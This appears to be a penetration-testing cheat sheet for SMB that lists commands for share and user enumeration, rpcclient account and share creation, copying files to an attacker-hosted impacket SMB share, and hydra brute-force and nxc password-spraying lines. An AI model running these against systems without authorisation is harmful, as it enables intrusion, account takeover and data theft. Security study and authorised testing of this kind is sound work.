---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# SMB (139, 445)

## Basic Commands

### SMBMap

{% tabs %}
{% tab title="Shares & Perms" %}
```bash
smbmap -H 10.10.10.10
```
{% endtab %}

{% tab title="Dirs" %}
```bash
smbmap -H 10.10.10.10 -r share1
```
{% endtab %}

{% tab title="Download" %}
```bash
smbmap -H 10.10.10.10 --download "share1\file1"
```
{% endtab %}

{% tab title="Upload" %}
```bash
smbmap -H 10.10.10.10 --upload file1 "share1\file1"
```
{% endtab %}
{% endtabs %}

### SMBClient

{% tabs %}
{% tab title="Shares" %}
```bash
smbclient -N -L //10.10.10.10
```
{% endtab %}

{% tab title="Connect" %}
```bash
smbclient -U user //10.129.42.253/share1
```
{% endtab %}

{% tab title="Download All" %}
```bash
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
{% endtab %}
{% endtabs %}

### RPC

{% tabs %}
{% tab title="Connect" %}
```bash
rpcclient -U "" 10.10.10.10
```
{% endtab %}

{% tab title="SysInfo" %}
```bash
srvinfo
```
{% endtab %}

{% tab title="Users" %}
```bash
enumdomusers
```
{% endtab %}

{% tab title="Groups" %}
```bash
enumalsgroups
```
{% endtab %}

{% tab title="Domains" %}
```bash
enumdomains
```
{% endtab %}

{% tab title="All" %}
```bash
netshareenumall
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Local Groups" %}
```bash
enumalsgroups builtin
```
{% endtab %}

{% tab title="Privileges" %}
```bash
enumprivs
```
{% endtab %}

{% tab title="SID" %}
```bash
lookupnames user
```
{% endtab %}

{% tab title="User Info" %}
```bash
queryuser RID
```
{% endtab %}

{% tab title="Pass Pol" %}
```bash
getusrdompwinfo 1000
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="New User" %}
```bash
# create user
createdomuser user1
# set new password
setuserinfo2 user1 24 'Pass123!'
```
{% endtab %}

{% tab title="New Share" %}
```bash
netshareadd "C:\Windows" "Windows" 10 "Share1"
```
{% endtab %}

{% tab title="Change Pass" %}
```bash
chgpasswd3 josh oldPass newPass
```
{% endtab %}
{% endtabs %}

### Operations

{% tabs %}
{% tab title="NSEs" %}
```bash
sudo nmap -sV -p 139,445 -script smb* 10.10.10.10
```
{% endtab %}

{% tab title="Mount" %}
```bash
mount -t cifs //10.10.10.10/share1 /mnt
```
{% endtab %}

{% tab title="List Dir Perms" %}
```bash
smbcacls -N '//10.10.10.10/share1' /dir1
```
{% endtab %}

{% tab title="List Perms Recursively" %}
{% code overflow="wrap" %}
```bash
$ for i in $(ls); do echo $i; smbcacls -N '//10.10.10.103/share1' /dir1/$i ; done
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="1. Server" %}
```bash
impacket-smbserver -smb2support share . -username test -password tes
```
{% endtab %}

{% tab title="2. Connect" %}
```powershell
 net use x: \\10.10.14.4\share /USER:test test
```
{% endtab %}

{% tab title="3. Transfer" %}
```powershell
copy file1 x:\
```
{% endtab %}
{% endtabs %}

### Other

{% tabs %}
{% tab title="Enum (1)" %}
```bash
/opt/enum4linux-ng/enum4linux-ng.py 10.10.10.10 -A
```
{% endtab %}

{% tab title="Enum (2)" %}
```bash
/opt/impacket/examples/samrdump.py 10.10.10.10
```
{% endtab %}

{% tab title="Version" %}
```bash
use auxiliary/scanner/smb/smb_version
```
{% endtab %}

{% tab title="User Enum" %}
```bash
use auxiliary/scanner/smb/smb_login
```
{% endtab %}
{% endtabs %}

## Attacks

{% tabs %}
{% tab title="BFA" %}
```bash
hydra -L user.list -P password.list smb://10.10.10.10
```
{% endtab %}

{% tab title="Spray*" %}
```bash
nxc smb 10.10.10.10 -u users.lst -p Password123! --continue-on-success
```
{% endtab %}

{% tab title="Untitled" %}

{% endtab %}
{% endtabs %}

{% hint style="info" %}
\*Add `--local-auth` if non-domain joined.
{% endhint %}
